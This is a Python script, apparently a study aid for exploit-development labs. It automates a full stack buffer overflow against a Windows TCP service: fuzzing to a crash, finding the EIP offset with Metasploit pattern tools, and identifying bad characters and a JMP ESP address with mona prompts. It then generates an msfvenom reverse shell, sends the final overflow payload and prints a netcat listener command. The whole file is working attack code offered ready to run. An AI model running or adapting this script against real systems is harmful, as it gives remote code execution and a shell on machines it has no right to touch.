#!/usr/bin/python3
"""
- Ask for Configurations and Target Information
- Confirm Above Information
- Fuzz the target to find crashpoint
- Ask User to restart the exe in immunity
- Generate msf pattern of the same length
- Ask for EIP
- Output and set Offset
- Ask to restart 
- Send bad characters 
- Specify mona command to get bad characters
- Specify mona command to find jmp point
- Ask for Jump Point
- Generate Exploit code
- Ask to restart
- Ask to run listener
- Send Exploit
"""

# Imports
from time import sleep
import socket
import subprocess
import ast
import colorama

GREEN = colorama.Fore.GREEN
RED = colorama.Fore.RED
BLUE = colorama.Fore.BLUE
YELLOW = colorama.Fore.YELLOW
RESET = colorama.Fore.RESET


class BoF:
    def __init__(self) -> None:
        self.target_ip = ""
        self.target_port = 0
        self.prefix = ""
        self.offset = ""
        self.bad_chars = ""
        self.jmp_point = ""
        self.timeout = 5


    def get_configs(self) -> None:
        self.target_ip = input("Enter Target IP: ")
        self.target_port = int(input("Enter Target Port: "))
        self.prefix = input("Enter Prefix with space (if any): ")

    def send_data(self, payload):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target_ip, self.target_port))
        s.recv(1024)
        s.send(bytes(payload, 'latin-1'))
    
    def check_restart(self) -> bool:
        print(BLUE + "[!] Restart the exploit on Immunity Debugger" + RESET)

        is_restarted = input("[?] Debugger Restarted? (Y/N): ")

        return is_restarted.upper() == "Y"

    def gen_bin(self, ch):
        return ast.literal_eval(repr(ch).replace("\\\\", "\\"))

    def fuzzer(self) -> int:
        crash_point = 0
        crashed = False

        string = "A" * 100
        string = self.prefix + string

        while not crashed:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.target_ip, self.target_port))
                s.recv(1024)
                s.send(bytes(string, 'latin-1'))
                s.recv(1024)
            except Exception as e:
                crashed = True

            crash_point = len(string) - len(self.prefix)
            string = string + "A" * 100
            sleep(1)

        return crash_point

    def send_pattern(self, length: str) -> None:
        base_cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
        pattern = subprocess.Popen([base_cmd, "-l", length], stdout=subprocess.PIPE)

        pattern = str(pattern.communicate()[0].decode()).strip('\n')

        payload = self.prefix + pattern

        self.send_data(payload=payload)

    def find_offset(self, length: str, eip :str) -> int:
        base_cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
        
        self.offset = subprocess.Popen([base_cmd, "-l", length, "-q", eip], stdout=subprocess.PIPE)

        self.offset = str(self.offset.communicate()[0].decode()).strip('\n')
        self.offset = int(self.offset.split().pop())


    def get_bad_characters(self) -> str:
        generated_badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

        return generated_badchars

    def send_bad_characters(self) -> None:
        generated_badchars = self.get_bad_characters()

        string = "A" * self.offset
        payload = self.prefix + string + "BBBB" + generated_badchars

        self.send_data(payload=payload)

    def format_bad_chars(self) -> None:
        self.bad_chars = self.bad_chars.split(" ")
        
        bad_chars = ""

        for char in self.bad_chars:
            bad_chars = bad_chars + "\\x{}".format(char)

        self.bad_chars = bad_chars
        
        print(BLUE + "[+] Formatted Bad Characters: {}".format(self.bad_chars) + RESET)

    def format_jmp_point(self) -> None:
        temp = self.jmp_point
        self.jmp_point = ["\\x{}{}".format(temp[i], temp[i+1]) for i in range(0, 7, 2)]
        self.jmp_point.reverse()

        del temp


    def send_final_payload(self) -> None:
        local_ip = input("[!] Enter Listener IP: ")
        local_port= input("[!] Enter Listener Port: ")
        msf_payload = "windows/shell_reverse_tcp"

        cmd = ["msfvenom", "-p", msf_payload, "LHOST={}".format(local_ip), "LPORT={}".format(local_port), "EXITFUNC=thread", "-b", self.bad_chars, "-f", "c"]

        print(YELLOW + "[*] Run a netcat listener using command: nc -lvp {}".format(local_port) + RESET)

        sleep(10)

        base_payload = subprocess.Popen(cmd, stdout=subprocess.PIPE)
        base_payload = str(base_payload.communicate()[0].decode()).split("\n")
        
        del base_payload[0]
        del base_payload[-1]
        base_payload[-1] = base_payload[-2].strip(";")
        
        base_payload = [x.strip("\"") for x in base_payload]

        base_payload = "".join(base_payload)

        final_payload = ""

        for x in base_payload.split("\\")[1:]:
            final_payload = final_payload + self.gen_bin("\\{}".format(x))

        string = "A" * self.offset

        retn = ""

        for x in self.jmp_point:
            retn = retn + self.gen_bin(x)

        padding = "\x90" * 32

        payload = self.prefix + string + retn + padding + final_payload

        print(BLUE + "[!] Sending Payload" + RESET)

        self.send_data(payload=payload)

    def run(self) -> None:
        self.get_configs()
        print(GREEN + "[+] Initiating Fuzzer" + RESET)
        crash_point = self.fuzzer()
        print(GREEN + "[+] Crashed at: {}".format(crash_point) + RESET)
        if self.check_restart():
            print(GREEN + "[+] Generating and sending a pattern of length {}".format(crash_point) + RESET)
            self.send_pattern(length=str(crash_point))
            eip = input("[+] Enter the value of EIP: ")
            self.find_offset(length=str(crash_point), eip=eip)
            print(GREEN + "[+] Offset Found: {}".format(self.offset))
        else:
            print(RED + "[X] Exiting Script" + RESET)

        if self.check_restart():
            print(BLUE + "[!] Configure Mona Working Directory with command: !mona config -set workingfolder c:\mona" + RESET)
            print(BLUE + "[!] Generate bytearray with mona: !mona bytearray -f bytearray.bin" + RESET)
            print(GREEN + "[+] Sending Bad Characters" + RESET)
            self.send_bad_characters()
            print(YELLOW + "[*] Check EIP Value to be 42424242" + RESET)
            esp = input("[+] Enter value of ESP: ")
            print(BLUE + "[!] Check bad characters using mona: !mona compare -f c:\\mona\\bytearray.bin -a {}".format(esp) + RESET)
            self.bad_chars = input("Input Bad Characters (Format: 05 a1): ")
            self.format_bad_chars()
        else:
            print(RED + "[X] Exiting Script" + RESET)

        print(BLUE + "[!] Find jump point using command: !mona jmp -r esp -cbp {}".format(self.bad_chars) + RESET)
        self.jmp_point = input("[+] Enter Jump Point value: ")
        self.format_jmp_point()
        if self.check_restart():
            self.send_final_payload()
        else:
            print(RED + "[X] Exiting Script" + RESET)

bof = BoF()
bof.run()
